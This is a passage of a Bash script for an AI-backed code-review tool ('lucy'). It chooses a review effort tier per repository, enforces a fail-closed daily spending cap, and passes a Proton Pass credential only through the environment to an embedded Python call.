    main_of(){ readlink -f "$(dirname "$(git -C "$1" rev-parse --path-format=absolute --git-common-dir 2>/dev/null)")"; }
    top="$(main_of "$repo")"; hqmain="$(main_of "$HQ")"
    if [ "$top" = "$hqmain" ]; then rig=hq
    elif [ "$(dirname "$top")" = "$hqmain/rigs" ]; then rig="$(basename "$top")"; fi
  fi
  # a tiers file jq cannot read, or one with no entry (and no unknown_rig) or no
  # classes array for this rig, counts as unknown, so it fails closed to xhigh;
  # an explicit empty classes array (peel) is a real no-class rig
  classes="$(jq -r --arg r "$rig" '(.rigs[$r] // .unknown_rig) as $e
    | if ($e | type) == "object" and ($e.classes | type) == "array" then $e.classes[] else "unknown" end' \
    "$TIERS" 2>/dev/null)" || classes=unknown
  if [ -z "$rig" ] || [ ! -r "$TIERS" ] || grep -qxE 'money|auth|data|unknown' <<<"$classes"; then effort=xhigh; else effort=high; fi
fi
case "$effort" in none|minimal|low|medium|high|xhigh|max) ;; *) die "unknown --effort: $effort (none|minimal|low|medium|high|xhigh|max)" 2;; esac

LOG="$HQ/ops/metrics/lucy-calls.jsonl"
cap="${LUCY_DAILY_CAP_USD:-5}"
[[ "$cap" =~ ^[0-9]+([.][0-9]+)?$ ]] || die "LUCY_DAILY_CAP_USD must be a number of USD, got: $cap" 2
# Fail closed: an unpriced model, an unreadable log or an unwritable log refuses
# the call, since its cost could not be counted toward the cap.
spent="$(CAP_CHECK=1 LOG_FILE="$LOG" MODEL="$MODEL" python3 -c "$PY" 2>&1)" || die "refused: $spent" 6
if [ "$dry" = 0 ]; then
  { mkdir -p "$(dirname "$LOG")" && : >>"$LOG"; } 2>/dev/null || die "refused: the call log $LOG is not writable, so this call's cost could not be counted" 6
fi
# anything but a plain decimal (inf, nan, an error line) counts as over the cap
case "$spent" in ''|*[!0-9.]*|*.*.*) over=1 ;; *) over="$(awk -v s="$spent" -v c="$cap" 'BEGIN { print (s + 0 >= c + 0) ? 1 : 0 }')" ;; esac

if [ "$dry" = 1 ]; then
  echo "review-plan: model=$MODEL effort=$effort rig=${rig:-unknown} diff_bytes=$(wc -c <"$tmpdiff") omitted=$omitted key_source=proton-pass endpoint=fixed spent_today_usd=$spent cap_usd=$cap base=${base_sha:-none} head=${head_sha:-none}"
  exit 0
fi

if [ "$over" = 1 ]; then
  echo "review: refused: lucy spent $spent USD today (UTC), at or over the daily cap of $cap USD." >&2
  echo "review: the review did NOT run. To run it anyway: LUCY_DAILY_CAP_USD=<higher> lucy ... (log: $LOG)" >&2
  exit 6
fi

# The credential never touches disk and is never an argument: it goes straight
# into the environment of the one python process that needs it.
KEY="$(PROTON_PASS_AGENT_REASON="cross-vendor adversarial code review (lucy)" \
  pp item view --vault-name "$PP_VAULT" --item-title "$PP_ITEM" --field "$PP_FIELD" 2>/dev/null | tr -d '\r\n')"
[ -n "$KEY" ] || die "no credential: Proton Pass item '$PP_ITEM' unreadable (is the pp session live?)"

echo "reviewing with $MODEL at effort $effort (cross-vendor) …" >&2
# CAP_CHECK, REPLAY and SELF_TEST are cleared: inherited from the caller they would
# short-circuit this call into the offline paths and exit 0 with no review.
env -u CAP_CHECK -u REPLAY -u SELF_TEST \
MODEL="$MODEL" EFFORT="$effort" CTX="${context:-}" DIFF_FILE="$tmpdiff" REVIEW_API="$API" OPENAI_API_KEY="$KEY" \
LOG_FILE="$LOG" CAP_USD="$cap" RIG="${rig:-}" BEAD="$bead" BASE="${base_sha:-}" HEAD_SHA="${head_sha:-}" DIFF_BYTES="$(wc -c <"$tmpdiff")" \
python3 -c "$PY"
